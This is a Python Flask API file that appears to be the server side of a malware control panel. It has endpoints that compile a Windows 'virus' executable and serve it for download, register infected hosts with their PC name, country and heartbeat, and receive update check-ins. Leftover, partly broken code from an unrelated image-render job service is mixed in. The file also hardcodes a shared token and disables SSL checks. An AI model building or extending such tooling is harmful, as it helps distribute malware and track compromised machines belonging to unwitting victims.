import requests
from flask import Blueprint, render_template, request, flash, jsonify, send_file
from flask_login import login_required, current_user
#from .models import Note, ImageSet, Image
from .models import Virus, Hosts
import sqlite3
from . import db
import json
import os
import socket
import threading
import socketio
import collections
from collections import OrderedDict
import traceback
# from . import crypto
import base64
# from cryptography.hazmat.primitives.serialization import Encoding
# from Crypto.PublicKey import RSA
# Import viris compiler script
import virusWindows as virus

## Ignore temp lack of ssl
os.environ['CURL_CA_BUNDLE'] = ''





api = Blueprint('api', __name__)
userToken = '1234567890'

def dbConnect():
    global conn
    #conn = sqlite3.connect('/var/www/instance/database.db')
    conn = sqlite3.connect('instance/databasen.db')
    global curs
    curs = conn.cursor()




def execute_query(query, params):
    with sqlite3.connect('instance/databasen.db') as conn:
        curs = conn.cursor()
        curs.execute(query, params)
        result = curs.fetchall()
    return result

def extract_data(request, keys):
    data = json.loads(request.data)
    return {key: data.get(key) for key in keys}

def make_response(message, status_code=200):
    return jsonify({'message': message}), status_code


#######################
####### APIs ##########
#######################


###### Virus calls #######

@api.route('/download')
def download_exe():
    exe_path = '/var/www/rubberduck/virus/generated_script.exe'  # Update with the actual path to your .exe file
    return send_file(exe_path, as_attachment=True)


@api.route('/update', methods=['POST'])
def update():
    print("Virus update called!")
    data = json.loads(request.data)
    print(data)
    try:
        return jsonify({'message': 'success'})  # Return a valid response
    except Exception as e:
        print(e)
        return jsonify({'message': str(e)})  # Return a v

#####

###### Create virus ######
@login_required
@api.route('/virusmake', methods=['GET', 'POST'])
def virusmake():
    virus.test()
    try:
        virus.generateExe("generated_script.py")
        return jsonify({'message': 'success'})  # Return a valid response
    except Exception as e:
        print(e)
        return jsonify({'message': str(e)})  # Return a valid response with the error message
   



##### SAVE DATA APIS #####
## saves a virus 
@api.route('/savevirus', methods=['POST'])
def saveVirus():
    #data = request.get_json()
    data = json.loads(request.data)
        #     noteId = note['noteId']
        #     note = Note.query.get(noteId)
        #     if note:
        #         if note.user_id == current_user.id:
        #             db.session.delete(note)
        #             db.session.commit()
    print(data)
    user_id = data['user_id']
    token = data['token']
    virus_type = data['virus_type']
    name = data['name']
    heartbeat_rate = data['heartbeat_rate']

    print(virus_type)
    print(user_id)
    print(name)
    print(token)

    if token == userToken :
        try:
            dbConnect()
            curs.execute("INSERT INTO Virus (virus_type, name, heartbeat_rate, user_id) VALUES (?, ?, ?, ?)", (virus_type, name, heartbeat_rate, user_id))
            conn.commit()
            conn.close()
            print("Success")
            flash('Virus Created!', category='success')
            return jsonify({'message': 'success'})
        except Exception as e:
            print(e)
            return jsonify({'message': e})
    else:
        print("token not valid or duplicate virus")
        flash('Duplicate virus  or wrong access token', category='error')
        return jsonify({'message': 'token not valid or duplicate virus '})


## saves a hosts 
@api.route('/savehost', methods=['POST'])
def saveHost():
    #data = request.get_json()
    data = json.loads(request.data)
        #     noteId = note['noteId']
        #     note = Note.query.get(noteId)
        #     if note:
        #         if note.user_id == current_user.id:
        #             db.session.delete(note)
        #             db.session.commit()
    print(data)
    ## Test
    
    user_id = data['user_id']
    virus_id = data['virus_id']
    token = data['token']
    pc_name = data['pc_name']
    country = data['country']
    host_notes = data['host_notes']
    settings = data['settings']
    last_heartbeat = data['last_heartbeat']


    if token == userToken :
        try:
            dbConnect()
            curs.execute("INSERT INTO Hosts (user_id, virus_id, pc_name, country, host_notes, settings, last_heartbeat) VALUES (?, ?, ?, ?, ?, ?, ?)", (user_id, virus_id, pc_name, country, host_notes, settings, last_heartbeat))
            conn.commit()
            conn.close()
            print("Success")
            flash('Host Created!', category='success')
            return jsonify({'message': 'success'})
        except Exception as e:
            print(e)
            return jsonify({'message': e})
    else:
        print("token not valid")
        flash('Possible wrong access token', category='error')
        return jsonify({'message': 'token not valid'})



##### GET DATA APIS #####
## Get all virus for the user to display in virus view
# @login_required
@api.route('/getvirus', methods=['GET'])
def getvirus(userId = "1", token = "1234567890"):
    print("getvirus")
    # print(current_user.id)
    # data = request.get_json()
    # print(data)
    # userId = data['userId']
    # token = data['token']
    # print(token)
    if token == userToken:
        try:
            dbConnect()
            print("Trying to get virus table data")
            #curs.execute("SELECT Image.image_name FROM Image WHERE Image.imageset_id = ? AND Job.status = ?", (imageSetId, status))
            curs.execute("SELECT * FROM Virus WHERE user_id = ?", (userId))
            #curs.execute("SELECT Image.image_name FROM Image INNER JOIN Job ON ? = Image.imageset_id AND Job.status = ?", (imageSetId, status))
            rows = curs.fetchall()
            #print(json.dumps( [dict(ix) for ix in rows] ))
            conn.close()
            print("jsondump")
            print(json.dumps(rows))
            return json.loads(json.dumps(rows))
        except Exception as e:
            print(e)
            return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})
#getJobs()


@api.route('/gethosts', methods=['GET'])
def getHosts(userId = "1", token = "1234567890"):
    print("getHosts")
    # print(current_user.id)
    # data = request.get_json()
    # print(data)
    # userId = data['userId']
    # token = data['token']
    # print(token)
    if token == userToken:
        try:
            dbConnect()
            print("Trying to get Hosts table data")
            #curs.execute("SELECT Image.image_name FROM Image WHERE Image.imageset_id = ? AND Job.status = ?", (imageSetId, status))
            curs.execute("SELECT * FROM Hosts WHERE user_id = ?", (userId))
            #curs.execute("SELECT Image.image_name FROM Image INNER JOIN Job ON ? = Image.imageset_id AND Job.status = ?", (imageSetId, status))
            rows = curs.fetchall()
            #print(json.dumps( [dict(ix) for ix in rows] ))
            conn.close()
            print("jsondump")
            print(json.dumps(rows))
            return json.loads(json.dumps(rows))
        except Exception as e:
            print(e)
            return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})
#getJobs()


####### DELETE APIS ##########

@api.route('/deletevirus', methods=['DELETE'])
@login_required
def deleteVirus():
    print("deleteVirus called")
    data = request.get_json()
    print("data:")
    print(data)
    id = data['virus_id']
    user_id = data['user_id']
    token = data['token']
    print(id)
    print(token)
    if token == userToken:
        try:
            dbConnect()
            print("Trying to delete Virus")
            curs.execute("DELETE FROM virus WHERE id = ? AND user_id = ?", (id, user_id))
            conn.commit()
            conn.close()
            print("Virus deleted")
            flash('Virus deleted!', category='success')
            return jsonify({'message': 'success'})
        except Exception as e:
            return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})


@api.route('/deletehost', methods=['DELETE'])
@login_required
def deleteHost():
    print("deleteHost called")
    data = request.get_json()
    print("data:")
    print(data)
    id = data['host_id']
    user_id = data['user_id']
    token = data['token']
    print(id)
    print(token)
    if token == userToken:
        try:
            dbConnect()
            print("Trying to delete Host")
            curs.execute("DELETE FROM Hosts WHERE id = ? AND user_id = ?", (id, user_id))
            conn.commit()
            conn.close()
            print("Host deleted")
            flash('Host deleted!', category='success')
            return jsonify({'message': 'success'})
        except Exception as e:
            return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})









########## Testing area ############


## Json examples ##

exampleUser = {
    "user_id": 1,
    "token": "1234567890",
    "email ": "tester@tester.com",
    "password ": "Test12345",
    "public_key ": "shapublic",
    "private_key ": "shaprivate",
    }

exampleVirus = {
    "user_id": 1,
    "token": "1234567890",
    "virus_type": "Silent",
    "name": "TestVirus1",
    "heartbeat_rate": "1h",
    "user_id": 1
    }

exampleHost= {
    "user_id": 1,
    "token": "1234567890",
    "pc_name": "Silent",
    "country": "TestVirus1",
    "host_notes": "1h",
    "settings": "SomeSetting",
    "last_heartbeat": "10/05/2023;21:45",
    "host_notes": "1h",
    "user_id": 1,
    "virus_id": 1,
    }

exampleDeleteHost= {
    "user_id": 1,
    "token": "1234567890",
    "id":1,
    }

exampleDeleteVirus= {
    "user_id": 1,
    "token": "1234567890",
    "id":1,
    }

## Example Python api call which POST to a remote server api with a json object which uses the exampleJson format in a try catch block
### Get examples ###
@api.route('/apivirussendexample', methods=['GET', 'POST'])
def apiVirusExample():
    try:
        url = "http://127.0.0.1:5000/savevirus"
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=json.dumps(exampleVirus), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"

@api.route('/apiupdate', methods=['GET', 'POST'])
def apiApiExample():
    try:
        url = "http://127.0.0.1:5000/update"
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=json.dumps(exampleVirus), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"

@api.route('/apihostssendexample', methods=['GET', 'POST'])
def apiHostsExample():
    try:
        url = "http://127.0.0.1.93:5000/savehost"
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=json.dumps(exampleHost), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"
### Get examples ###
@api.route('/apigetvirusexample', methods=['GET', 'POST'])
def apiGetVirusExample():
    try:
        url = "http://127.0.0.1:5000/getvirus"
        headers = {'Content-Type': 'application/json'}
        #response = requests.post(url, data=json.dumps(current_user.id), headers=headers)
        response = requests.get(url, data=json.dumps(current_user.id), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"
    
@api.route('/apigethostsexample', methods=['GET', 'POST'])
def apiGetHostsExample():
    try:
        url = "http://127.0.0.1:5000/gethosts"
        headers = {'Content-Type': 'application/json'}
        response = requests.get(url, data=json.dumps(current_user.id), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"   

### Delete examples ###
@api.route('/apideletevirusexample', methods=['GET', 'POST'])
def apiDeleteVirusExample():
    print("apiDeleteVirusExample")
    print(current_user.id)
    try:
        url = "http://127.0.0.1:5000/deletevirus"
        headers = {'Content-Type': 'application/json'}
        #response = requests.post(url, data=json.dumps(current_user.id), headers=headers)
        response = requests.delete(url, data=json.dumps(exampleDeleteHost), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"
    
@api.route('/apideletehostsexample', methods=['GET', 'POST'])
def apiDeleteHostsExample():
    print("apiDeleteHostsExample")
    try:
        url = "http://127.0.0.1:5000/deletehost"
        headers = {'Content-Type': 'application/json'}
        response = requests.delete(url, data=json.dumps(exampleDeleteHost), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"   






















   ####### OLD ########


### API Receive ###
## Api which saves image names and imageset id to a sqlite database, but also saves user_id to the imageset table
@api.route('/saveimages', methods=['POST'])
def saveImages():
    print("saveImages called")
    data = json.loads(request.get_json())
    print(data)
    imageNames = data['imageName']
    imageSetId = data['imageSetId']
    userId = data['userId']
    token = data['token']

    if token == userToken:
        try:
            dbConnect()
            print("Trying to add images and imagset to db")
            curs.execute("INSERT INTO image_set (user_id) VALUES (?)", (str(userId)))
            conn.commit()
            for imageName in imageNames:
                curs.execute("INSERT INTO image (image_name, imageset_id) VALUES (?, ?)", (imageName, imageSetId))
                conn.commit()
            conn.close()
            print("Success")
            return jsonify({'message': 'success'})
        except Exception as e:
            print(e)
            return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})
            
## Api which saves rendered model_name , user_id and imageset_id to a sqlite database, inside a try catch block which returns exeption as e if fails, the call needs to be verified with a token
@api.route('/savemodel', methods=['POST', 'GET'])
def saveModel():
    print("saveModel")
    data = request.get_json()
    print(data)
    modelName = data['modelName']
    userId = data['userId']
    imageSetId = data['imageSetId']
    token = data['token']
    jobId = data['jobId']
    print(modelName)
    print(userId)
    print(imageSetId)
    print(token)
    if token == userToken:
        try:
            dbConnect()
            curs.execute("INSERT INTO rendered_model (model_name, user_id, imageset_id, job_id) VALUES (?, ?, ?, ?)", (modelName, userId, imageSetId, jobId))
            conn.commit()
            conn.close()
            print("Success")
            return jsonify({'message': 'success'})
        except Exception as e:
            print(e)
            return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})

## saves a job to render so the client PC can ask for open jobs, and then innerjoin the rest to get a list of images to download with SFTP
@api.route('/savejob', methods=['POST'])
def saveJob():
    #data = request.get_json()
    data = json.loads(request.data)
        #     noteId = note['noteId']
        #     note = Note.query.get(noteId)
        #     if note:
        #         if note.user_id == current_user.id:
        #             db.session.delete(note)
        #             db.session.commit()
    print(data)
    status = data['status']
    userId = data['userId']
    imageSetId = data['imageSetId']
    token = data['token']
    print(status)
    print(userId)
    print(imageSetId)
    print(token)
    duplicateCheck = bool(Job.query.filter_by(user_id=userId, imageset_id=imageSetId).first())
    
    print(duplicateCheck)
    
    if token == userToken and duplicateCheck == False:
        try:
            dbConnect()
            
            curs.execute("INSERT INTO Job (status, user_id, imageset_id) VALUES (?, ?, ?)", (status, userId, imageSetId))
            conn.commit()
            conn.close()
            print("Success")
            flash('Job Created!', category='success')
            return jsonify({'message': 'success'})
        except Exception as e:
            print(e)
            return jsonify({'message': e})
    else:
        print("token not valid or duplicate job")
        flash('Duplicate job or wrong access token', category='error')
        return jsonify({'message': 'token not valid or duplicate job'})

## Api which gets all job which are set to render in status, and innerjoin the imageSet with the Image table on imageset_id
@api.route('/getjob', methods=['POST'])
def getJob():
    data = request.get_json()
    print(data)
    status = data['status']
    token = data['token']
    imageSetId = data['imageSetId']
    status = data['status']
    print(status)
    print(token)
    if token == userToken:
        try:
            dbConnect()
            #curs.execute("SELECT Image.image_name FROM Image WHERE Image.imageset_id = ? AND Job.status = ?", (imageSetId, status))
            curs.execute("SELECT * FROM Job INNER JOIN Image ON ? = Image.imageset_id AND Job.status = ?", (imageSetId, status))
            #curs.execute("SELECT Image.image_name FROM Image INNER JOIN Job ON ? = Image.imageset_id AND Job.status = ?", (imageSetId, status))
            rows = curs.fetchall()
            
            #print(json.dumps( [dict(ix) for ix in rows] ))
            conn.close()
            print("jsondump")
            print(json.dumps(rows))
            return json.dumps(rows)
        except Exception as e:
            print(e)
            return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})

## Get all current jobs for the user to display in Renders view
# @api.route('/getjobs', methods=['GET'])
# @login_required
def getJobs(userId = "1", token = "1234567890"):
    #print(current_user.id)
    # data = request.get_json()
    # print(data)
    
    # token = data['token']
    # imageSetId = data['imageSetId']
    # status = data['status']
    # print(status)
    # print(token)
    print("getjobs")
    if token == userToken:
        try:
            print("Trying to get jobs")
            dbConnect()
            #curs.execute("SELECT Image.image_name FROM Image WHERE Image.imageset_id = ? AND Job.status = ?", (imageSetId, status))
            curs.execute("SELECT * FROM Job WHERE user_id = ?", (userId))
            #curs.execute("SELECT Image.image_name FROM Image INNER JOIN Job ON ? = Image.imageset_id AND Job.status = ?", (imageSetId, status))
            rows = curs.fetchall()
            

            #print(json.dumps( [dict(ix) for ix in rows] ))
            conn.close()
            print("jsondump")
            print(json.dumps(rows))
            return json.loads(json.dumps(rows))
        except Exception as e:
            print(e)
            return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})
#getJobs()


## Get all renders for the user to display in Renders view
# @api.route('/getjobs', methods=['GET'])
# @login_required
@api.route('/getrenders', methods=['GET'])
def getRenders(userId = "1", token = "1234567890"):
    print("getrenders")
    # print(current_user.id)
    # data = request.get_json()
    # print(data)
    # userId = data['userId']
    # token = data['token']
    # token = data['token']
    # imageSetId = data['imageSetId']
    # status = data['status']
    # print(status)
    # print(token)
    if token == userToken:
        try:
            dbConnect()
            print("Trying to get renders")
            #curs.execute("SELECT Image.image_name FROM Image WHERE Image.imageset_id = ? AND Job.status = ?", (imageSetId, status))
            curs.execute("SELECT * FROM rendered_model WHERE user_id = ?", (userId))
            #curs.execute("SELECT Image.image_name FROM Image INNER JOIN Job ON ? = Image.imageset_id AND Job.status = ?", (imageSetId, status))
            rows = curs.fetchall()
            #print(json.dumps( [dict(ix) for ix in rows] ))
            conn.close()
            print("jsondump")
            print(json.dumps(rows))
            return json.loads(json.dumps(rows))
        except Exception as e:
            print(e)
            return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})
#getJobs()


# @api.route('/getjobs', methods=['GET'])
# @login_required
# @api.route('/getrenderbyid', methods=['GET'])
def getRenderById(renderId, token = "1234567890"):
    print("getrenders")
    
    if token == userToken:
        try:
            dbConnect()
            print("Trying to get one render")
            #curs.execute("SELECT Image.image_name FROM Image WHERE Image.imageset_id = ? AND Job.status = ?", (imageSetId, status))
            curs.execute("SELECT * FROM rendered_model WHERE id = ?", (renderId))
            #curs.execute("SELECT Image.image_name FROM Image INNER JOIN Job ON ? = Image.imageset_id AND Job.status = ?", (imageSetId, status))
            rows = curs.fetchall()
            #print(json.dumps( [dict(ix) for ix in rows] ))
            conn.close()
            print("jsondump")
            print(json.dumps(rows))
            return json.loads(json.dumps(rows))
        except Exception as e:
            print(e)
            return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})
#getJobs()














### Crypto ###
## Checks if public key from user public_key from the sql database matches in the private key
# def checkKeyMatch(privateKey):
#     dbConnect()
#     curs.execute("SELECT public_key FROM user WHERE id = ?", (str(current_user.id)))
#     publicKey = curs.fetchone()
#     conn.close()
#     print(publicKey)
#     keyCheck = crypto.checkKeysFromBytes(privateKey, publicKey)
#     print(keyCheck)


    

## Saves public key to user in sqlite db from ID
# @api.route('/savepublickey', methods=['POST', 'GET'])
# @login_required
# def savePublicKey(id = 1):
#     print("savePublicKey called")
#     # data = request.get_json()
#     # print(data)
#     # id = data['id']
#     # privateKey = data['privateKey']

#     # Gets back a tuple with (secret, public) key and encodes it to utf-8 so it can be saved to the db
#     # Obtain the RsaKey object
#     key = crypto.readKeysFromFile()[1]
#     key = key.publickey().export_key()
#     print(key)

#     # Export the key as PEM-formatted data
#     # public_key_pem = key.export_key(format='PEM')

#     # # Encode the raw data as a base64 string
#     # public_key_b64 = base64.b64encode(public_key_pem).decode('utf-8')


#     # print(public_key_b64)
#     # print(id)
#     #print(public_key_b64)
#     try:
#         dbConnect()
#         curs.execute("UPDATE User SET public_key = ? WHERE id = ?", (key, id))
#         conn.commit()
#         conn.close()
#         return jsonify({'message': 'success'})
#     except Exception as e:
#         return jsonify({'message': e})

## Saves public key to user in sqlite db from ID
# @api.route('/getpublickey', methods=['POST', 'GET'])
# @login_required
# def getPublicKeyAndDecode():
#     dbConnect()
#     curs.execute("SELECT public_key FROM user WHERE id = ?", (str(current_user.id)))
#     rawKey = curs.fetchone()[0]
#     conn.close()
#     print(rawKey)
#     key = RSA.import_key(rawKey)

#     # Decode the encoded key
#     #decoded_key = base64.b64decode(key)

#     # Load the decoded key data into a key object
#     #public_key = RSA.import_key(key)

#     # # Use the key object to perform operations, such as encrypting data
#     # data = b"..."
#     # encrypted_data = public_key.encrypt(data, 32)[0]
#     # print(key)
    
#     # Gives error if endpoint does not expect RSA key
#     return key

# ## Checks key match from private key and public key
# @api.route('/keycheck', methods=['POST', 'GET'])
# @login_required
# def CheckKeys():
#     publiKey = getPublicKeyAndDecode()
#     privateKey = crypto.readKeysFromFile()[0]
#     keyCheck = crypto.checkKeysFromBytes(privateKey, publiKey)
#     print(keyCheck)
#     return keyCheck


















# # @api.route('/getImages', methods=['POST'])

# def getImages(user_id="1",token="1234567890",imageSetId=""):
    
#     if token == userToken:
#         try:
#             dbConnect()
#             print("getImages, userid is: " + str(user_id) )
#             #curs.execute("SELECT Image.image_name FROM Image WHERE Image.imageset_id = ? AND Job.status = ?", (imageSetId, status))
#             curs.execute("SELECT * FROM Image_set INNER JOIN Image ON Image_set.id = Image.imageset_id AND Image_set.user_id = ?", (user_id))
#             #curs.execute("SELECT Image.image_name FROM Image INNER JOIN Job ON ? = Image.imageset_id AND Job.status = ?", (imageSetId, status))
#             rows = curs.fetchall()
#             #print(json.dumps( [dict(ix) for ix in rows] ))
#             conn.close()
#             # data = {}
#             print(rows)
#             # Create an OrderedDict to store the data
#             data = OrderedDict()
#             # Create a list to store the image sets
#             image_sets = []
#             # Loop through the rows in the SQLite result
#             for index, row in enumerate(rows):
#             # Check if the image set ID already exists in the list
#                 if row[0] not in image_sets:
#                     # Add the image set to the list
#                     image_sets.append(row[0])
#                     # Create a dictionary to store the image set data
#                     image_set = OrderedDict()
#                     # Add the image set ID to the dictionary
#                     image_set["image_set_id"] = row[0]
#                     # Create a list to store the image names
#                     image_names = []
#                     # Add the image name to the list
#                     image_names.append(row[3])
#                     # Add the image names to the dictionary
#                     image_set["image_names"] = image_names
#                     # Add the image set to the data
#                     data[len(data)] = image_set
#                 else:
#                     # Checks if row[0] matches the previous and, if row[3] is not in the list, and then nest appends it to the list
#                     if row[0] == rows[index - 1][0] and row[3] not in data[len(data) - 1]["image_names"]:
#                         data[len(data) - 1]["image_names"].append(row[3]) 

#             # Convert the data to JSON
#             sortedData = json.dumps(data)
#             json_data = json.loads(sortedData)

#             #json_data = jsonify(data)

#             # Print the JSON data
#             print("Json DATA")
#             print(json_data)


#             # # Create an OrderedDict to store the data
#             # data = OrderedDict()

#             # # Create a list to store the image sets
#             # image_sets = []

#             # # Loop through the rows in the SQLite result
#             # for index, row in enumerate(rows):
#             # # Check if the image set ID already exists in the list
#             #     if row[0] not in image_sets:
#             #         # Add the image set to the list
#             #         image_sets.append(row[0])

#             #         # Create a dictionary to store the image set data
#             #         # image_set = OrderedDict()
#             #         image_set = {}

#             #         # Add the image set ID to the dictionary
#             #         image_set["image_set_id"] = row[0]

#             #         # Create a list to store the image names
#             #         image_names = []

#             #         # Add the image name to the list
#             #         image_names.append(row[3])

#             #         # Add the image names to the dictionary
#             #         image_set["image_names"] = image_names

#             #         # Add the image set to the data
#             #         data.append(image_set)

#             # # Convert the data to JSON
#             # json_data = json.dumps(data)

#             # # Print the JSON data
#             # print(json_data)


#             # for row in rows:
#             #     key = row[0]  # the first column is the key
#             #     value = row[1]  # the second column is the value
#             #     data[key] = value  # add the key and value to the dictionary
#             # json_data = json.dumps(data)

#             # imageSets = api.getImages(str(current_user.id))
#             # print(imageSets)
#             ## Convert the SQL data to json so each got a key and value
#             # objects_list = []
#             # for image in rows:
#             #     # if image[0] not in objects_list and image[3] not in objects_list:
#             #     if not isinstance(image, objects_list):
#             #         d = collections.OrderedDict()
#             #         d['image_set_id'] = image[0]
#             #         d['image_name'] = image[3]
#             #         objects_list.append(d)
                       
#                 # d = collections.OrderedDict()
#                 # d['image_set_id'] = image[0]
#                 # d['image_name'] = image[3]
#                 # objects_list.append(d)
#             #imagesJson = json.dumps(objects_list)
#             # print(imagesJson)

#             # # print the JSON data
#             # print("JSON Data")
            

#             # print("jsondump")
#             # print(json.dumps(rows))
#             # return json.dumps(rows)
#             return json_data
#         except Exception as e:
#             print("####Error: ")
#             print(traceback.format_exc())
#             print(e)
#             return jsonify({'message': e})
#     else:
#         return jsonify({'message': 'token not valid'})

#getImages()


## Api which deletes a rendered model from the sqlite database 
# where the rendered model Id equals the id supplied, the call needs to be verified with a token
@api.route('/deleteRenderedModel', methods=['DELETE'])
def deleteRenderedModel():
    data = request.get_json()
    print(data)
    id = data['id']
    token = data['token']
    print(id)
    print(token)
    if token == userToken:
        try:
            dbConnect()
            curs.execute("DELETE FROM RenderedModel WHERE id = ?", (id))
            conn.commit()
            conn.close()
            return jsonify({'message': 'success'})
        except Exception as e:
            return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})

## Api which deletes a meshroom jobs from the sqlite database 
# where the job Id equals the id supplied, the call needs to be verified with a token
@api.route('/deletejob', methods=['DELETE'])
@login_required
def deleteJob():
    print("deleteJob called")
    data = request.get_json()
    print("data:")
    print(data)
    id = data['jobId']
    userId = data['userId']
    token = data['token']
    print(id)
    print(token)
    if token == userToken:
        try:
            dbConnect()
            print("Trying to delete job")
            curs.execute("DELETE FROM Job WHERE id = ? AND user_id = ?", (id, userId))
            conn.commit()
            conn.close()
            print("Job deleted")
            flash('Job deleted!', category='success')
            return jsonify({'message': 'success'})
        except Exception as e:
            return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})

## Api which deletes imageSet matching id, and delete all images with the same imageset_id from the sqlite database, the call needs to be verified with a token
@api.route('/deleteImageSetAndImages', methods=['DELETE'])
def deleteImageSetAndImages():
    data = request.get_json()
    print(data)
    id = data['id']
    token = data['token']
    print(id)
    print(token)
    if token == '123456789':
        try:
            dbConnect()
            curs.execute("DELETE FROM Image_set WHERE id = ?", (id))
            conn.commit()
            curs.execute("DELETE FROM Image WHERE imageset_id = ?", (id))
            conn.commit()
            conn.close()
            return jsonify({'message': 'success'})
        except Exception as e:
            return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})

## Api which gets the highest ID count in the sqlite db in table ImageSet
@api.route('/gethighestimagesetid', methods=['GET'])
def getHighestImageSetId():
    print("getHighestImageSetId called")
    try:
        data = request.get_json()
        print(data)
        #id = data['id']
        dbConnect()
        curs.execute("SELECT MAX(id) FROM Image_set ORDER BY id DESC LIMIT 1")
        rows = curs.fetchall()
        conn.close()
        print(rows)
        sortedData = json.dumps(rows)
        json_data = json.loads(sortedData)
        return json_data
    except Exception as e:
        return jsonify({'message': e})


## 

## Socket server which can send data to client through a new thread
# global socServer
# def socketServer():
#     # get the hostname
#     host = socket.gethostname()
#     port = 5001  # initiate port no above 1024

#     server_socket = socket.socket()  # get instance
#     # look closely. The bind() function takes tuple as argument
#     server_socket.bind((host, port))  # bind host address and port together

#     # configure how many client the server can listen simultaneously
#     server_socket.listen(2)
#     conn, address = server_socket.accept()  # accept new connection
#     print("Connection from: " + str(address))
#     while True:
#         # receive data stream. it won't accept data packet greater than 1024 bytes
#         data = conn.recv(1024).decode()
#         if not data:
#             # if data is not received break
#             break
#         print("from connected user: " + str(data))
#         data = input(' -> ')
#         conn.send(data.encode())  # send data to the client

#     conn.close()  # close the connection
#     socServer.join() # close the thread



# socServer = threading.Thread(target=socketServer, args=(), daemon=True)
# socServer.start()

### API Send Example ###
#Meshroom images for render pipeline test
exampleImagemmMeshroom = {
    "userId": 1,
    "token": "1234567890",
    "imageSetId": 2,
    "imageName": [ "IMG_1024.JPG", "IMG_1026.JPG", "IMG_1028.JPG", "IMG_1030.JPG", "IMG_1032.JPG", "IMG_1040.JPG"]
    }

exampleModelJson = {
    "token": "1234567890",
    "modelName": "/model_10/",
    "imageSetId": 6,
    "userId": 1,
    "jobId": 6
    }

exampleJobJson = {
    "token" : "1234567890",
    "status" : "render",
    "userId" : 1,
    "imageSetId" : 2
}

exampleGetJobJson = {
    "token" : "1234567890",
    "status" : "render",
    "userId" : 1,
    "imageSetId" : 2
}

## Exampple Python api call POST to saveJob api with the exampleJobJson to send
@api.route('/apisavejobexample', methods=['GET', 'POST'])
def apiSaveJobExample():
    try:
        url = "http://127.0.0.1:5000/saveJob"
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=json.dumps(exampleJobJson), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"

## Exampple Python api gets all open jobs connected to userID and imageSetId 
@api.route('/apigetjobexample', methods=['GET', 'POST'])
def apigetjobexample():
    try:
        url = "http://127.0.0.1:5000/getJob"
        headers = {'Content-Type': 'application/json'}
        #response = requests.post(url, data=json.dumps(exampleJobJson), headers=headers)
        response = requests.post(url, data=json.dumps(exampleJobJson), headers=headers).json()
        print("The response:")
        print(response)
        # print(response.json())
        # responseJson = response.json()
        print(response[1][5]) # Prints out the imageName in the json array index position 5
        imageNames = []
        # For each in the response, append to a list all the values of the response[*][i] image names, and checks for duplicate names
        for i in range(len(response)):
            print(response[i][5])
            if response[i][5] not in imageNames:
                imageNames.append(response[i][5])
        print(imageNames)
        return json.dumps(response)
    except Exception as e:
        print(e)
        return "Error"


############
############

## Example Python api call which POST to a remote server api with a json object which uses the exampleJson format in a try catch block
@api.route('/apiimagesendexample', methods=['GET', 'POST'])
def apiImageSendExample():
    try:
        url = "http://127.0.0.1:5000/saveimages"
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=json.dumps(exampleImagemmMeshroom), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"

@api.route('/apisavemodelexample', methods=['GET', 'POST'])
def apiSaveModelExample():
    try:
        url = "http://127.0.0.1:5000/savemodel"
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=json.dumps(exampleModelJson), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"

@api.route('/apigetmodelsexample', methods=['GET', 'POST'])
def apiGetModelsExample():
    try:
        url = "http://127.0.0.1:5000/getmodels"
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=json.dumps(current_user.id), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"

@api.route('/apigetmaxidexample', methods=['GET', 'POST'])
def apiGetMaxIdExample():
    try:
        url = "http://127.0.0.1:5000/gethighestimagesetid"
        headers = {'Content-Type': 'application/json'}
        response = requests.get(url, data=json.dumps(current_user.id), headers=headers)
        print("Max id is: ")
        test = response.json()
        print(test[0])
        return "Success"
    except Exception as e:
        print(e)
        return "Error"
#######################
apiGetMaxIdExample()
